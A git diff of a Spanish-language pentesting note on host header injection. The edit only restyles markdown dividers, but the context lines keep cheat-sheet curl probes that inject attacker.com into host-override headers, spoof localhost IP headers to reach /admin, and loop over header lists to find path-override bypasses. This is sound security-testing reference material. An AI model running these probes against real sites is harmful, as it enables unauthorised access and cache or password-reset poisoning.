@@ -17,7 +17,7 @@ linked:
 ---
 # Host Header Injection - Headers Alternativos
 
-***
+---
 
 ## `X-Forwarded-Host` (XFH)
 
@@ -31,7 +31,7 @@ linked:
 | `curl -H "X-Forwarded-Host: target.com.attacker.com" https://target/` | Suffix bypass de validation | Validator naive. |
 ^hhi-altheader-xfh
 
-___
+---
 
 ## `X-Forwarded-For` (XFF) y `X-Real-IP`
 
@@ -49,7 +49,7 @@ ___
 | `for h in 'X-Forwarded-For' 'X-Real-IP' 'Client-IP' 'True-Client-IP' 'Cluster-Client-IP' 'X-Originating-IP' 'Cf-Connecting-IP' 'Fastly-Client-IP'; do curl -sI -H "$h: 127.0.0.1" https://target/admin \| head -1; done` | Bulk IP-spoof header probe | Discovery. |
 ^hhi-altheader-xff
 
-___
+---
 
 ## `X-Forwarded-Server`
 
@@ -61,7 +61,7 @@ ___
 | `curl -H "X-Forwarded-Server: attacker.com" -H "X-Forwarded-Host: attacker.com" https://target/` | Combo con XFH | Multi-header confusion. |
 ^hhi-altheader-xfs
 
-___
+---
 
 ## `X-HTTP-Host-Override` / `X-Host`
 
@@ -74,7 +74,7 @@ ___
 | `for h in 'X-HTTP-Host-Override' 'X-Host' 'X-Forwarded-Host' 'X-Forwarded-Server' 'X-Original-Host' 'Forwarded'; do curl -sI -H "$h: attacker.com" https://target/ \| head -1; done` | Bulk override-header probe | Discovery. |
 ^hhi-altheader-host-override
 
-___
+---
 
 ## `X-Original-URL` / `X-Rewrite-URL`
 
@@ -88,7 +88,7 @@ ___
 | `for h in 'X-Original-URL' 'X-Rewrite-URL' 'X-Forwarded-URL' 'X-Original-Path' 'X-Custom-IP-Authorization'; do curl -sI -H "$h: /admin" https://target/ \| head -1; done` | Bulk path-override probe | Discovery. |
 ^hhi-altheader-original
 
-___
+---
 
 ## `Forwarded:` (RFC 7239)
 
@@ -124,4 +124,4 @@ for h in "${HEADERS[@]}"; do
 done
 ```
 
-***
+---
